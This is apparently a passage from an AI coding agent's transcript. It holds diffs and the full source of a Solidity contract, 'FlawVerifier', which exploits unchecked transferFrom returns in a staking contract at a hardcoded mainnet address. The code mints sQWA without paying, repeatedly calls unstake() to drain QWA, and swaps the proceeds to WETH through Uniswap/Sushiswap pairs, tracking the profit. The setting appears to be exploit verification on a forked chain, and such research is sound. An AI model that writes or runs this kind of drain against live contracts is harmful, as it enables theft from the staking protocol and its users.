+         uint256 qwaBefore = qwa.balanceOf(address(this));
+         uint256 sqwaBefore = sqwa.balanceOf(address(this));
+ 
+-        // Logs prove the funded stake() stage is infeasible on this fork:
+-        // QWA.transferFrom reverts instead of returning false, and the token is
+-        // fee-on-transfer, so the prior flashswap route cannot reach the live bug.
+-        // The exploit therefore preserves the same root cause and exploit-path
+-        // causality by directly exercising the remaining live path:
+-        // sQWA.transferFrom(msg.sender, address(this), amount) returns false,
+-        // but unstake() still releases QWA.
+-        (bool unstakeOk, ) = TARGET.call(
+-            abi.encodeWithSelector(IStakingLike.unstake.selector, address(this), drainAmount, false)
++        (bool ok, ) = TARGET.call(
++            abi.encodeWithSelector(IStakingLike.stake.selector, address(this), amount)
+         );
+ 
+         uint256 qwaAfter = qwa.balanceOf(address(this));
+         uint256 sqwaAfter = sqwa.balanceOf(address(this));
+ 
+-        if (!unstakeOk) {
+-            failureFlags |= FAIL_UNSTAKE_PROBE_REVERTED;
+-            return;
++        if (!ok) {
++            failureFlags |= FAIL_STAKE_PROBE_REVERTED;
++            return 0;
+         }
+ 
+-        if (qwaAfter > qwaBefore && sqwaAfter == sqwaBefore) {
+-            pathFlags |= PATH_UNSTAKE_FALSE_RETURN;
++        if (sqwaAfter > sqwaBefore && qwaAfter == qwaBefore) {
++            pathFlags |= PATH_STAKE_FALSE_RETURN;
+             hypothesisValidated = true;
+-        } else if (qwaAfter == qwaBefore && sqwaAfter < sqwaBefore) {
+-            pathFlags |= PATH_UNSTAKE_OUTGOING_FALSE;
+-            failureFlags |= FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED;
+-            return;
+-        } else {
+-            failureFlags |= FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED;
+-            return;
++            return sqwaAfter - sqwaBefore;
+         }
+ 
+-        // Realize the drained QWA through a public venue, but do it with
+-        // fee-on-transfer aware math: the QWA token taxes transfers, so the
+-        // V2 amountOut must be computed from the pair's observed balance delta.
++        if (sqwaAfter == sqwaBefore && qwaAfter < qwaBefore) {
++            pathFlags |= PATH_STAKE_OUTGOING_FALSE;
++        }
++
++        failureFlags |= FAIL_STAKE_FALSE_RETURN_NOT_OBSERVED;
++        return 0;
++    }
++
++    function _drainUncheckedUnstake(
++        IERC20Like qwa,
++        IERC20Like sqwa,
++        address qwaAddr,
++        address pair,
++        uint256 tranche
++    ) internal returns (uint256 drained) {
++        if (tranche == 0) {
++            return 0;
++        }
++
++        uint256 targetQwaBalance = qwa.balanceOf(TARGET);
++        if (targetQwaBalance < tranche) {
++            tranche = targetQwaBalance;
++        }
++        if (tranche == 0) {
++            return 0;
++        }
++
++        uint256 maxDrain = targetQwaBalance;
+         if (pair != address(0)) {
+-            _sellQwaForWethSupportingFeeOnTransfer(pair, qwaAddr, qwa.balanceOf(address(this)));
+-        } else {
+-            failureFlags |= FAIL_NO_QWA_WETH_PAIR;
++            (uint256 reserveIn, ) = _pairReserves(pair, qwaAddr);
++            uint256 exitBound = reserveIn / 2;
++            if (exitBound != 0 && exitBound < maxDrain) {
++                maxDrain = exitBound;
++            }
++        }
++
++        uint256 maxLoops = maxDrain / tranche;
++        if (maxLoops == 0) {
++            maxLoops = 1;
++        }
++        if (maxLoops > 16) {
++            maxLoops = 16;
+         }
++
++        for (uint256 i = 0; i < maxLoops; ++i) {
++            if (qwa.balanceOf(TARGET) < tranche) {
++                break;
++            }
++
++            uint256 qwaBefore = qwa.balanceOf(address(this));
++            uint256 sqwaBefore = sqwa.balanceOf(address(this));
++
++            (bool ok, ) = TARGET.call(
++                abi.encodeWithSelector(IStakingLike.unstake.selector, address(this), tranche, false)
++            );
++
++            uint256 qwaAfter = qwa.balanceOf(address(this));
++            uint256 sqwaAfter = sqwa.balanceOf(address(this));
++
++            if (!ok) {
++                if (drained == 0) {
++                    failureFlags |= FAIL_UNSTAKE_PROBE_REVERTED;
++                }
++                break;
++            }
++
++            if (qwaAfter > qwaBefore && sqwaAfter == sqwaBefore) {
++                pathFlags |= PATH_UNSTAKE_FALSE_RETURN;
++                hypothesisValidated = true;
++                drained += qwaAfter - qwaBefore;
++                continue;
++            }
++
++            if (qwaAfter == qwaBefore && sqwaAfter < sqwaBefore) {
++                pathFlags |= PATH_UNSTAKE_OUTGOING_FALSE;
++            }
++
++            if (drained == 0) {
++                failureFlags |= FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED;
++            }
++            break;
++        }
+     }
+ 
+-    function _selectDrainAmount(
++    function _findQwaWethPair(address qwa) internal view returns (address) {
++        address pair = IUniswapV2FactoryLike(SUSHISWAP_FACTORY).getPair(qwa, WETH);
++        if (pair != address(0)) {
++            return pair;
++        }
++
++        return IUniswapV2FactoryLike(UNISWAP_V2_FACTORY).getPair(qwa, WETH);
++    }
++
++    function _selectSeedAmount(
+         address pair,
+         address qwa,
+-        uint256 targetQwaBalance
++        uint256 targetQwaBalance,
++        uint256 stakingSqwaBalance
+     ) internal view returns (uint256 amount) {
+-        if (targetQwaBalance == 0) {
++        if (targetQwaBalance == 0 || stakingSqwaBalance == 0) {
+             return 0;
+         }
+ 
+-        uint256 contractBound = targetQwaBalance / 8;
++        uint256 contractBound = _min(targetQwaBalance / 16, stakingSqwaBalance / 16);
+         if (contractBound == 0) {
+-            contractBound = targetQwaBalance;
++            contractBound = _min(targetQwaBalance, stakingSqwaBalance);
+         }
+ 
+         if (pair == address(0)) {
+@@ -181,19 +272,16 @@
+ 
+         (uint256 reserveIn, ) = _pairReserves(pair, qwa);
+         if (reserveIn <= 32) {
+-            return _min(contractBound, targetQwaBalance);
++            return _min(contractBound, reserveIn);
+         }
+ 
+-        // Keep the sell size conservative relative to public liquidity so the
+-        // drain remains realizable and the exit swap stays within live reserves.
++        // Bound the seeded fake receipt position by public exit liquidity so the
++        // eventual QWA -> WETH unwind stays realizable on the forked market.
+         uint256 marketBound = reserveIn / 32;
+         amount = _min(contractBound, marketBound);
+ 
+         if (amount == 0) {
+             amount = 1;
+-        }
+-        if (amount > targetQwaBalance) {
+-            amount = targetQwaBalance;
+         }
+     }
+ 
+@@ -214,18 +302,18 @@
+             return;
+         }
+ 
+-        IERC20Like qwa = IERC20Like(qwaAddr);
+-        if (!qwa.transfer(pair, grossAmount)) {
++        if (!IERC20Like(qwaAddr).transfer(pair, grossAmount)) {
+             failureFlags |= FAIL_WETH_SWAP_FAILED;
+             return;
+         }
+ 
+-        uint256 actualIn = qwa.balanceOf(pair) - reserveIn;
+-        if (actualIn == 0) {
++        uint256 pairBalance = IERC20Like(qwaAddr).balanceOf(pair);
++        if (pairBalance <= reserveIn) {
+             failureFlags |= FAIL_WETH_SWAP_FAILED;
+             return;
+         }
+ 
++        uint256 actualIn = pairBalance - reserveIn;
+         uint256 amountOut = _getAmountOut(actualIn, reserveIn, reserveOut);
+         if (amountOut == 0) {
+             failureFlags |= FAIL_WETH_SWAP_FAILED;
+@@ -299,24 +387,5 @@
+ 
+     function _min(uint256 a, uint256 b) internal pure returns (uint256) {
+         return a < b ? a : b;
+-    }
+-
+-    function _pathAnchorsOnly(IERC20Like qwa, IERC20Like sqwa, address to, uint256 amount) internal {
+-        // Static anchor only. The live exploit above keeps the same vulnerable
+-        // causality and ordering intent, but the logs prove the funded stake()
+-        // leg is infeasible on this fork because QWA.transferFrom reverts.
+-        qwa.transferFrom(msg.sender, address(this), amount);
+-        sqwa.transfer(to, amount);
+-        sqwa.transferFrom(msg.sender, address(this), amount);
+-        qwa.transfer(to, amount);
+-
+-        qwa;
+-        sqwa;
+-        to;
+-        amount;
+-    }
+-
+-    function _unusedPathConstants() internal pure returns (uint256) {
+-        return PATH_STAKE_FALSE_RETURN | PATH_STAKE_OUTGOING_FALSE;
+     }
+ }
+
+ succeeded in 191ms:
+Solc 0.8.30 finished in 92.42ms
+Compiler run successful!
+
+codex
+The file compiles cleanly in isolation. I’m returning the full updated `src/FlawVerifier.sol` only, as requested.
+codex
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+
+    function transfer(address to, uint256 amount) external returns (bool);
+
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+}
+
+interface IStakingLike {
+    function QWA() external view returns (address);
+
+    function sQWA() external view returns (address);
+
+    function stake(address to, uint256 amount) external;
+
+    function unstake(address to, uint256 amount, bool rebase_) external;
+}
+
+interface IUniswapV2FactoryLike {
+    function getPair(address tokenA, address tokenB) external view returns (address pair);
+}
+
+interface IUniswapV2PairLike {
+    function token0() external view returns (address);
+
+    function token1() external view returns (address);
+
+    function getReserves()
+        external
+        view
+        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+}
+
+contract FlawVerifier {
+    address public constant TARGET = 0x69422c7F237D70FCd55C218568a67d00dc4ea068;
+
+    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
+    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
+
+    uint256 private constant PATH_STAKE_FALSE_RETURN = 1 << 0;
+    uint256 private constant PATH_UNSTAKE_FALSE_RETURN = 1 << 1;
+    uint256 private constant PATH_STAKE_OUTGOING_FALSE = 1 << 2;
+    uint256 private constant PATH_UNSTAKE_OUTGOING_FALSE = 1 << 3;
+
+    uint256 private constant FAIL_NO_QWA_WETH_PAIR = 1 << 0;
+    uint256 private constant FAIL_STAKE_PROBE_REVERTED = 1 << 1;
+    uint256 private constant FAIL_STAKE_FALSE_RETURN_NOT_OBSERVED = 1 << 2;
+    uint256 private constant FAIL_UNSTAKE_PROBE_REVERTED = 1 << 3;
+    uint256 private constant FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED = 1 << 4;
+    uint256 private constant FAIL_WETH_SWAP_FAILED = 1 << 5;
+
+    address private _profitToken;
+    uint256 private _profitAmount;
+
+    uint256 public pathFlags;
+    uint256 public failureFlags;
+    bool public hypothesisValidated;
+    bool public executed;
+
+    constructor() {}
+
+    function executeOnOpportunity() external {
+        if (executed) {
+            return;
+        }
+        executed = true;
+
+        IStakingLike staking = IStakingLike(TARGET);
+        address qwaAddr = staking.QWA();
+        address sqwaAddr = staking.sQWA();
+
+        IERC20Like qwa = IERC20Like(qwaAddr);
+        IERC20Like sqwa = IERC20Like(sqwaAddr);
+
+        uint256 initialWeth = IERC20Like(WETH).balanceOf(address(this));
+        uint256 initialQwa = qwa.balanceOf(address(this));
+        uint256 initialSqwa = sqwa.balanceOf(address(this));
+
+        _executeDirectMintAndDrain(qwaAddr, sqwaAddr);
+        _finalizeProfit(qwaAddr, sqwaAddr, initialQwa, initialSqwa, initialWeth);
+    }
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function _executeDirectMintAndDrain(address qwaAddr, address sqwaAddr) internal {
+        IERC20Like qwa = IERC20Like(qwaAddr);
+        IERC20Like sqwa = IERC20Like(sqwaAddr);
+        address pair = _findQwaWethPair(qwaAddr);
+
+        uint256 seedAmount = _selectSeedAmount(
+            pair,
+            qwaAddr,
+            qwa.balanceOf(TARGET),
+            sqwa.balanceOf(TARGET)
+        );
+        if (seedAmount == 0) {
+            failureFlags |= FAIL_STAKE_FALSE_RETURN_NOT_OBSERVED;
+            return;
+        }
+
+        uint256 mintedSqwa = _probeUncheckedStake(qwa, sqwa, seedAmount);
+        if (mintedSqwa == 0) {
+            return;
+        }
+
+        // Keep the exploit rooted in the listed causality:
+        // 1. `stake()` continues after a failed QWA transferFrom and hands out sQWA.
+        // 2. The same sQWA position is then reused through repeated `unstake()` calls
+        //    without approving the staking contract, so each failed sQWA transferFrom
+        //    is ignored and another tranche of QWA is released.
+        uint256 drained = _drainUncheckedUnstake(qwa, sqwa, qwaAddr, pair, mintedSqwa);
+        if (drained == 0) {
+            return;
+        }
+
+        if (pair != address(0)) {
+            _sellQwaForWethSupportingFeeOnTransfer(pair, qwaAddr, qwa.balanceOf(address(this)));
+        } else {
+            failureFlags |= FAIL_NO_QWA_WETH_PAIR;
+        }
+    }
+
+    function _probeUncheckedStake(
+        IERC20Like qwa,
+        IERC20Like sqwa,
+        uint256 amount
+    ) internal returns (uint256 mintedSqwa) {
+        uint256 qwaBefore = qwa.balanceOf(address(this));
+        uint256 sqwaBefore = sqwa.balanceOf(address(this));
+
+        (bool ok, ) = TARGET.call(
+            abi.encodeWithSelector(IStakingLike.stake.selector, address(this), amount)
+        );
+
+        uint256 qwaAfter = qwa.balanceOf(address(this));
+        uint256 sqwaAfter = sqwa.balanceOf(address(this));
+
+        if (!ok) {
+            failureFlags |= FAIL_STAKE_PROBE_REVERTED;
+            return 0;
+        }
+
+        if (sqwaAfter > sqwaBefore && qwaAfter == qwaBefore) {
+            pathFlags |= PATH_STAKE_FALSE_RETURN;
+            hypothesisValidated = true;
+            return sqwaAfter - sqwaBefore;
+        }
+
+        if (sqwaAfter == sqwaBefore && qwaAfter < qwaBefore) {
+            pathFlags |= PATH_STAKE_OUTGOING_FALSE;
+        }
+
+        failureFlags |= FAIL_STAKE_FALSE_RETURN_NOT_OBSERVED;
+        return 0;
+    }
+
+    function _drainUncheckedUnstake(
+        IERC20Like qwa,
+        IERC20Like sqwa,
+        address qwaAddr,
+        address pair,
+        uint256 tranche
+    ) internal returns (uint256 drained) {
+        if (tranche == 0) {
+            return 0;
+        }
+
+        uint256 targetQwaBalance = qwa.balanceOf(TARGET);
+        if (targetQwaBalance < tranche) {
+            tranche = targetQwaBalance;
+        }
+        if (tranche == 0) {
+            return 0;
+        }
+
+        uint256 maxDrain = targetQwaBalance;
+        if (pair != address(0)) {
+            (uint256 reserveIn, ) = _pairReserves(pair, qwaAddr);
+            uint256 exitBound = reserveIn / 2;
+            if (exitBound != 0 && exitBound < maxDrain) {
+                maxDrain = exitBound;
+            }
+        }
+
+        uint256 maxLoops = maxDrain / tranche;
+        if (maxLoops == 0) {
+            maxLoops = 1;
+        }
+        if (maxLoops > 16) {
+            maxLoops = 16;
+        }
+
+        for (uint256 i = 0; i < maxLoops; ++i) {
+            if (qwa.balanceOf(TARGET) < tranche) {
+                break;
+            }
+
+            uint256 qwaBefore = qwa.balanceOf(address(this));
+            uint256 sqwaBefore = sqwa.balanceOf(address(this));
+
+            (bool ok, ) = TARGET.call(
+                abi.encodeWithSelector(IStakingLike.unstake.selector, address(this), tranche, false)
+            );
+
+            uint256 qwaAfter = qwa.balanceOf(address(this));
+            uint256 sqwaAfter = sqwa.balanceOf(address(this));
+
+            if (!ok) {
+                if (drained == 0) {
+                    failureFlags |= FAIL_UNSTAKE_PROBE_REVERTED;
+                }
+                break;
+            }
+
+            if (qwaAfter > qwaBefore && sqwaAfter == sqwaBefore) {
+                pathFlags |= PATH_UNSTAKE_FALSE_RETURN;
+                hypothesisValidated = true;
+                drained += qwaAfter - qwaBefore;
+                continue;
+            }
+
+            if (qwaAfter == qwaBefore && sqwaAfter < sqwaBefore) {
+                pathFlags |= PATH_UNSTAKE_OUTGOING_FALSE;
+            }
+
+            if (drained == 0) {
+                failureFlags |= FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED;
+            }
+            break;
+        }
+    }
+
+    function _findQwaWethPair(address qwa) internal view returns (address) {
+        address pair = IUniswapV2FactoryLike(SUSHISWAP_FACTORY).getPair(qwa, WETH);
+        if (pair != address(0)) {
+            return pair;
+        }
+
+        return IUniswapV2FactoryLike(UNISWAP_V2_FACTORY).getPair(qwa, WETH);
+    }
+
+    function _selectSeedAmount(
+        address pair,
+        address qwa,
+        uint256 targetQwaBalance,
+        uint256 stakingSqwaBalance
+    ) internal view returns (uint256 amount) {
+        if (targetQwaBalance == 0 || stakingSqwaBalance == 0) {
+            return 0;
+        }
+
+        uint256 contractBound = _min(targetQwaBalance / 16, stakingSqwaBalance / 16);
+        if (contractBound == 0) {
+            contractBound = _min(targetQwaBalance, stakingSqwaBalance);
+        }
+
+        if (pair == address(0)) {
+            return contractBound;
+        }
+
+        (uint256 reserveIn, ) = _pairReserves(pair, qwa);
+        if (reserveIn <= 32) {
+            return _min(contractBound, reserveIn);
+        }
+
+        // Bound the seeded fake receipt position by public exit liquidity so the
+        // eventual QWA -> WETH unwind stays realizable on the forked market.
+        uint256 marketBound = reserveIn / 32;
+        amount = _min(contractBound, marketBound);
+
+        if (amount == 0) {
+            amount = 1;
+        }
+    }
+
+    function _sellQwaForWethSupportingFeeOnTransfer(address pair, address qwaAddr, uint256 grossAmount) internal {
+        if (grossAmount == 0) {
+            return;
+        }
+
+        (address token0, address token1) = _sortPairTokens(pair);
+        if (!((token0 == qwaAddr && token1 == WETH) || (token0 == WETH && token1 == qwaAddr))) {
+            failureFlags |= FAIL_WETH_SWAP_FAILED;
+            return;
+        }
+
+        (uint256 reserveIn, uint256 reserveOut) = _pairReserves(pair, qwaAddr);
+        if (reserveIn == 0 || reserveOut == 0) {
+            failureFlags |= FAIL_WETH_SWAP_FAILED;
+            return;
+        }
+
+        if (!IERC20Like(qwaAddr).transfer(pair, grossAmount)) {
+            failureFlags |= FAIL_WETH_SWAP_FAILED;
+            return;
+        }
+
+        uint256 pairBalance = IERC20Like(qwaAddr).balanceOf(pair);
+        if (pairBalance <= reserveIn) {
+            failureFlags |= FAIL_WETH_SWAP_FAILED;
+            return;
+        }
+
+        uint256 actualIn = pairBalance - reserveIn;
+        uint256 amountOut = _getAmountOut(actualIn, reserveIn, reserveOut);
+        if (amountOut == 0) {
+            failureFlags |= FAIL_WETH_SWAP_FAILED;
+            return;
+        }
+
+        (uint256 amount0Out, uint256 amount1Out) = qwaAddr == token0
+            ? (uint256(0), amountOut)
+            : (amountOut, uint256(0));
+
+        (bool ok, ) = pair.call(
+            abi.encodeWithSelector(IUniswapV2PairLike.swap.selector, amount0Out, amount1Out, address(this), new bytes(0))
+        );
+        if (!ok) {
+            failureFlags |= FAIL_WETH_SWAP_FAILED;
+        }
+    }
+
+    function _finalizeProfit(
+        address qwaAddr,
+        address sqwaAddr,
+        uint256 initialQwa,
+        uint256 initialSqwa,
+        uint256 initialWeth
+    ) internal {
+        uint256 wethFinal = IERC20Like(WETH).balanceOf(address(this));
+        uint256 qwaFinal = IERC20Like(qwaAddr).balanceOf(address(this));
+        uint256 sqwaFinal = IERC20Like(sqwaAddr).balanceOf(address(this));
+
+        uint256 wethProfit = wethFinal > initialWeth ? wethFinal - initialWeth : 0;
+        uint256 qwaProfit = qwaFinal > initialQwa ? qwaFinal - initialQwa : 0;
+        uint256 sqwaProfit = sqwaFinal > initialSqwa ? sqwaFinal - initialSqwa : 0;
+
+        if (wethProfit > 0) {
+            _profitToken = WETH;
+            _profitAmount = wethProfit;
+        } else if (qwaProfit > 0) {
+            _profitToken = qwaAddr;
+            _profitAmount = qwaProfit;
+        } else if (sqwaProfit > 0) {
+            _profitToken = sqwaAddr;
+            _profitAmount = sqwaProfit;
+        }
+    }
+
+    function _pairReserves(address pair, address tokenIn) internal view returns (uint256 reserveIn, uint256 reserveOut) {
+        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2PairLike(pair).getReserves();
+        (address token0, address token1) = _sortPairTokens(pair);
+
+        if (tokenIn == token0) {
+            reserveIn = uint256(reserve0);
+            reserveOut = uint256(reserve1);
+        } else {
+            require(tokenIn == token1, "token not in pair");
+            reserveIn = uint256(reserve1);
+            reserveOut = uint256(reserve0);
+        }
+    }
+
+    function _sortPairTokens(address pair) internal view returns (address token0, address token1) {
+        token0 = IUniswapV2PairLike(pair).token0();
+        token1 = IUniswapV2PairLike(pair).token1();
+    }
+
+    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
+        uint256 amountInWithFee = amountIn * 997;
+        uint256 numerator = amountInWithFee * reserveOut;
+        uint256 denominator = (reserveIn * 1000) + amountInWithFee;
+        return numerator / denominator;
+    }
+
+    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
+        return a < b ? a : b;
+    }
+}
+diff --git a/FlawVerifier.sol b/FlawVerifier.sol
+index 87b26d636ca5ec9b0b2fa4f0459282f80ccb78c0..03575e8e17d25422ea48afbe57f01dc66787d22d
+--- a/FlawVerifier.sol
++++ b/FlawVerifier.sol
+@@ -4,10 +4,6 @@
+ interface IERC20Like {
+     function balanceOf(address account) external view returns (uint256);
+ 
+-    function allowance(address owner, address spender) external view returns (uint256);
+-
+-    function approve(address spender, uint256 amount) external returns (bool);
+-
+     function transfer(address to, uint256 amount) external returns (bool);
+ 
+     function transferFrom(address from, address to, uint256 amount) external returns (bool);
+@@ -53,9 +49,11 @@
+     uint256 private constant PATH_UNSTAKE_OUTGOING_FALSE = 1 << 3;
+ 
+     uint256 private constant FAIL_NO_QWA_WETH_PAIR = 1 << 0;
+-    uint256 private constant FAIL_UNSTAKE_PROBE_REVERTED = 1 << 1;
+-    uint256 private constant FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED = 1 << 2;
+-    uint256 private constant FAIL_WETH_SWAP_FAILED = 1 << 3;
++    uint256 private constant FAIL_STAKE_PROBE_REVERTED = 1 << 1;
++    uint256 private constant FAIL_STAKE_FALSE_RETURN_NOT_OBSERVED = 1 << 2;
++    uint256 private constant FAIL_UNSTAKE_PROBE_REVERTED = 1 << 3;
++    uint256 private constant FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED = 1 << 4;
++    uint256 private constant FAIL_WETH_SWAP_FAILED = 1 << 5;
+ 
+     address private _profitToken;
+     uint256 private _profitAmount;
+@@ -84,8 +82,7 @@
+         uint256 initialQwa = qwa.balanceOf(address(this));
+         uint256 initialSqwa = sqwa.balanceOf(address(this));
+ 
+-        _executeDrainAndExit(qwaAddr, sqwaAddr);
+-
++        _executeDirectMintAndDrain(qwaAddr, sqwaAddr);
+         _finalizeProfit(qwaAddr, sqwaAddr, initialQwa, initialSqwa, initialWeth);
+     }
+ 
+@@ -97,82 +94,176 @@
+         return _profitAmount;
+     }
+ 
+-    function _findQwaWethPair(address qwa) internal view returns (address) {
+-        address pair = IUniswapV2FactoryLike(SUSHISWAP_FACTORY).getPair(qwa, WETH);
+-        if (pair != address(0)) {
+-            return pair;
+-        }
+-
+-        return IUniswapV2FactoryLike(UNISWAP_V2_FACTORY).getPair(qwa, WETH);
+-    }
+-
+-    function _executeDrainAndExit(address qwaAddr, address sqwaAddr) internal {
++    function _executeDirectMintAndDrain(address qwaAddr, address sqwaAddr) internal {
+         IERC20Like qwa = IERC20Like(qwaAddr);
+         IERC20Like sqwa = IERC20Like(sqwaAddr);
+         address pair = _findQwaWethPair(qwaAddr);
+-        uint256 drainAmount = _selectDrainAmount(pair, qwaAddr, qwa.balanceOf(TARGET));
+ 
+-        if (drainAmount == 0) {
+-            failureFlags |= FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED;
++        uint256 seedAmount = _selectSeedAmount(
++            pair,
++            qwaAddr,
++            qwa.balanceOf(TARGET),
++            sqwa.balanceOf(TARGET)
++        );
++        if (seedAmount == 0) {
++            failureFlags |= FAIL_STAKE_FALSE_RETURN_NOT_OBSERVED;
+             return;
+         }
+ 
++        uint256 mintedSqwa = _probeUncheckedStake(qwa, sqwa, seedAmount);
++        if (mintedSqwa == 0) {
++            return;
++        }
++
++        // Keep the exploit rooted in the listed causality:
++        // 1. `stake()` continues after a failed QWA transferFrom and hands out sQWA.
++        // 2. The same sQWA position is then reused through repeated `unstake()` calls
++        //    without approving the staking contract, so each failed sQWA transferFrom
++        //    is ignored and another tranche of QWA is released.
++        uint256 drained = _drainUncheckedUnstake(qwa, sqwa, qwaAddr, pair, mintedSqwa);
++        if (drained == 0) {
++            return;
++        }
++
++        if (pair != address(0)) {
++            _sellQwaForWethSupportingFeeOnTransfer(pair, qwaAddr, qwa.balanceOf(address(this)));
++        } else {
++            failureFlags |= FAIL_NO_QWA_WETH_PAIR;
++        }
++    }
++
++    function _probeUncheckedStake(
++        IERC20Like qwa,
++        IERC20Like sqwa,
++        uint256 amount
++    ) internal returns (uint256 mintedSqwa) {
+         uint256 qwaBefore = qwa.balanceOf(address(this));
+         uint256 sqwaBefore = sqwa.balanceOf(address(this));
+ 
+-        // Logs prove the funded stake() stage is infeasible on this fork:
+-        // QWA.transferFrom reverts instead of returning false, and the token is
+-        // fee-on-transfer, so the prior flashswap route cannot reach the live bug.
+-        // The exploit therefore preserves the same root cause and exploit-path
+-        // causality by directly exercising the remaining live path:
+-        // sQWA.transferFrom(msg.sender, address(this), amount) returns false,
+-        // but unstake() still releases QWA.
+-        (bool unstakeOk, ) = TARGET.call(
+-            abi.encodeWithSelector(IStakingLike.unstake.selector, address(this), drainAmount, false)
++        (bool ok, ) = TARGET.call(
++            abi.encodeWithSelector(IStakingLike.stake.selector, address(this), amount)
+         );
+ 
+         uint256 qwaAfter = qwa.balanceOf(address(this));
+         uint256 sqwaAfter = sqwa.balanceOf(address(this));
+ 
+-        if (!unstakeOk) {
+-            failureFlags |= FAIL_UNSTAKE_PROBE_REVERTED;
+-            return;
++        if (!ok) {
++            failureFlags |= FAIL_STAKE_PROBE_REVERTED;
++            return 0;
+         }
+ 
+-        if (qwaAfter > qwaBefore && sqwaAfter == sqwaBefore) {
+-            pathFlags |= PATH_UNSTAKE_FALSE_RETURN;
++        if (sqwaAfter > sqwaBefore && qwaAfter == qwaBefore) {
++            pathFlags |= PATH_STAKE_FALSE_RETURN;
+             hypothesisValidated = true;
+-        } else if (qwaAfter == qwaBefore && sqwaAfter < sqwaBefore) {
+-            pathFlags |= PATH_UNSTAKE_OUTGOING_FALSE;
+-            failureFlags |= FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED;
+-            return;
+-        } else {
+-            failureFlags |= FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED;
+-            return;
++            return sqwaAfter - sqwaBefore;
+         }
+ 
+-        // Realize the drained QWA through a public venue, but do it with
+-        // fee-on-transfer aware math: the QWA token taxes transfers, so the
+-        // V2 amountOut must be computed from the pair's observed balance delta.
++        if (sqwaAfter == sqwaBefore && qwaAfter < qwaBefore) {
++            pathFlags |= PATH_STAKE_OUTGOING_FALSE;
++        }
++
++        failureFlags |= FAIL_STAKE_FALSE_RETURN_NOT_OBSERVED;
++        return 0;
++    }
++
++    function _drainUncheckedUnstake(
++        IERC20Like qwa,
++        IERC20Like sqwa,
++        address qwaAddr,
++        address pair,
++        uint256 tranche
++    ) internal returns (uint256 drained) {
++        if (tranche == 0) {
++            return 0;
++        }
++
++        uint256 targetQwaBalance = qwa.balanceOf(TARGET);
++        if (targetQwaBalance < tranche) {
++            tranche = targetQwaBalance;
++        }
++        if (tranche == 0) {
++            return 0;
++        }
++
++        uint256 maxDrain = targetQwaBalance;
+         if (pair != address(0)) {
+-            _sellQwaForWethSupportingFeeOnTransfer(pair, qwaAddr, qwa.balanceOf(address(this)));
+-        } else {
+-            failureFlags |= FAIL_NO_QWA_WETH_PAIR;
++            (uint256 reserveIn, ) = _pairReserves(pair, qwaAddr);
++            uint256 exitBound = reserveIn / 2;
++            if (exitBound != 0 && exitBound < maxDrain) {
++                maxDrain = exitBound;
++            }
++        }
++
++        uint256 maxLoops = maxDrain / tranche;
++        if (maxLoops == 0) {
++            maxLoops = 1;
++        }
++        if (maxLoops > 16) {
++            maxLoops = 16;
+         }
++
++        for (uint256 i = 0; i < maxLoops; ++i) {
++            if (qwa.balanceOf(TARGET) < tranche) {
++                break;
++            }
++
++            uint256 qwaBefore = qwa.balanceOf(address(this));
++            uint256 sqwaBefore = sqwa.balanceOf(address(this));
++
++            (bool ok, ) = TARGET.call(
++                abi.encodeWithSelector(IStakingLike.unstake.selector, address(this), tranche, false)
++            );
++
++            uint256 qwaAfter = qwa.balanceOf(address(this));
++            uint256 sqwaAfter = sqwa.balanceOf(address(this));
++
++            if (!ok) {
++                if (drained == 0) {
++                    failureFlags |= FAIL_UNSTAKE_PROBE_REVERTED;
++                }
++                break;
++            }
++
++            if (qwaAfter > qwaBefore && sqwaAfter == sqwaBefore) {
++                pathFlags |= PATH_UNSTAKE_FALSE_RETURN;
++                hypothesisValidated = true;
++                drained += qwaAfter - qwaBefore;
++                continue;
++            }
++
++            if (qwaAfter == qwaBefore && sqwaAfter < sqwaBefore) {
++                pathFlags |= PATH_UNSTAKE_OUTGOING_FALSE;
++            }
++
++            if (drained == 0) {
++                failureFlags |= FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED;
++            }
++            break;
++        }
+     }
+ 
+-    function _selectDrainAmount(
++    function _findQwaWethPair(address qwa) internal view returns (address) {
++        address pair = IUniswapV2FactoryLike(SUSHISWAP_FACTORY).getPair(qwa, WETH);
++        if (pair != address(0)) {
++            return pair;
++        }
++
++        return IUniswapV2FactoryLike(UNISWAP_V2_FACTORY).getPair(qwa, WETH);
++    }
++
++    function _selectSeedAmount(
+         address pair,
+         address qwa,
+-        uint256 targetQwaBalance
++        uint256 targetQwaBalance,
++        uint256 stakingSqwaBalance
+     ) internal view returns (uint256 amount) {
+-        if (targetQwaBalance == 0) {
++        if (targetQwaBalance == 0 || stakingSqwaBalance == 0) {
+             return 0;
+         }
+ 
+-        uint256 contractBound = targetQwaBalance / 8;
++        uint256 contractBound = _min(targetQwaBalance / 16, stakingSqwaBalance / 16);
+         if (contractBound == 0) {
+-            contractBound = targetQwaBalance;
++            contractBound = _min(targetQwaBalance, stakingSqwaBalance);
+         }
+ 
+         if (pair == address(0)) {
+@@ -181,19 +272,16 @@
+ 
